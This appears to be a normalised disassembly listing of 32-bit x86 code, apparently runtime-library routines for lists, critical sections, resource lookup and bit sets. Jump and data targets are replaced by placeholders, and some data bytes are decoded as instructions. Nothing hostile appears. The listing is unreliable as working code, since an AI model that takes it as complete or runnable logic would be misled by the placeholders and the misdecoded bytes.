mov eax [ r-xdata ]
call sub_418028
mov edx eax
mov eax [ rw-data ]
call sub_418bdc
pop edi
pop esi
pop ebx
retn
sub_41808c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418c64
mov esi eax
xor edx edx
push ebp
push sub_4180f6
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418cc8
retn
mov edx ebx
mov eax esi
call sub_4188a0
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
call sub_403bc8
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418108
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418c64
mov esi eax
xor edx edx
push ebp
push sub_418172
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418cc8
retn
mov edx ebx
mov eax esi
call sub_4188a0
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403bc8
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418184
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_408184
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4181c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_4041b8
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_418208
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_4188fc
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_418744
sub_418260
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4188a0
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4182a0
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_418260
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_4182c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_404624
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b5a8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418338
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41b0a8
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403368
retn
sub_418348
push ebx
call sub_406234
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_406234
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_418744
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov ebx eax
call sub_406234
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov ebx eax
call sub_406234
mov [ eax + 0xc ] ebx
sub_4183a0
push ebx
push esi
push edi
call sub_406234
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4188a0
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_4183d0
push ebx
push esi
call sub_406234
mov eax [ eax + 0x8 ]
call sub_403368
call sub_406234
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_418988
mov esi eax
call sub_406234
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_418790
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_406234
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403368
sub_41842c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4184c2
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4184c9
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4032f4
call sub_41842c
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4032b8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4043c8
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_4054e4
call sub_405534
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_4182c4
or bl al
sub_4184d4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_418582
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_418563
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_4032b0
call sub_41842c
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_418348
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41856a
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4183a0
retn
call sub_4183d0
sub_418598
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
push 0x400
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b72c
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
xor eax eax
push ebp
push sub_4185f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41e8b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4185fc
mov eax [ ebp - 0x4 ]
call sub_403368
retn
sub_418604
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax ebx
call sub_4032b0
push eax
mov eax esi
call sub_4032b0
pop edx
cmp edx eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
call sub_419628
push eax
mov eax esi
call sub_419628
pop edx
cmp edx eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_418711
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_418598
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4186f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_418598
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_408110
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4186fb
mov eax [ ebp - 0xc ]
call sub_403368
retn
mov al 0x1
sub_418724
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_418744
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418790
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41882c
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028e8
mov edx esi
mov eax ebx
call sub_4188a0
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4187f4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4187f0
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
jmp sub_403b1c
sub_41882c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_418874
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405fc8
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4187f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41887b
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_4188a0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41882c
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_4188c8
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_418a5c
retn
sub_4188fc
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_41891c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41882c
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028e8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418994
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41882c
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_4188a0
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_418790
xor ecx ecx
mov edx esi
mov eax ebx
call sub_41891c
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_4189ec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41882c
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418a3c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4188fc
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418790
sub_418a5c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41882c
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_40272c
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_418a98
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41882c
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_418a5c
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402d24
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_418790
dec ebp
inc edi
jne r-xdata
sub_418b0c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403338
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_418b60
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40371c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418c64
xor eax eax
push ebp
push sub_418bc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403368
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403358
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418bc9
mov eax [ ebp - 0x4 ]
call sub_418cc8
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_418bdc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418c64
xor eax eax
push ebp
push sub_418c58
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418744
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4188fc
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418c5f
mov eax [ ebp - 0x4 ]
call sub_418cc8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_41882c
sub_418c78
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418c64
xor eax eax
push ebp
push sub_418cbb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418a3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418cc2
mov eax [ ebp - 0x4 ]
call sub_418cc8
retn
sub_418cd4
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_418d28
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_418d28
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_418d04
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026ec
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402d24
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_40270c
mov edx edi
mov eax ebp
call sub_418d1c
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028e8
sub_418dcc
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_418d04
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_418d28
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_418e10
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_418e88
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax esi
call sub_41bd48
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_418ec8
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418f7e
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041fc
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4032b8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4043c8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4032b8
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc34
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418f85
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_418fa4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_419039
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4032b8
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_4043c8
mov eax ebx
mov si 0xffff
call sub_403564
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419040
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax ebx
mov si 0xffff
call sub_403564
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403564
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4044e4
sub_41904b
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4035a4
mov eax ebx
mov si 0xffff
call sub_403564
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403564
push eax
lea eax [ ebx + 0x4 ]
call sub_405b04
mov ecx eax
mov edx r-xdata
pop eax
call sub_40341c
sub_419096
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_4190c8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_4190e8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40341c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_419110
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_405b04
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_403564
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax edi
call sub_405b04
mov edx eax
mov eax esi
call sub_419110
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_405b04
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_4191a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_4191fd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405b04
mov edx eax
mov eax edi
call sub_419110
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419204
lea eax [ ebp - 0x4 ]
call sub_405b04
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_41920c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_419244
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418e88
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_419274
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4192b0
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4032b8
mov edx esp
mov eax esi
call sub_4043c8
add esp 0x100
pop esi
pop ebx
retn
sub_4192d8
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
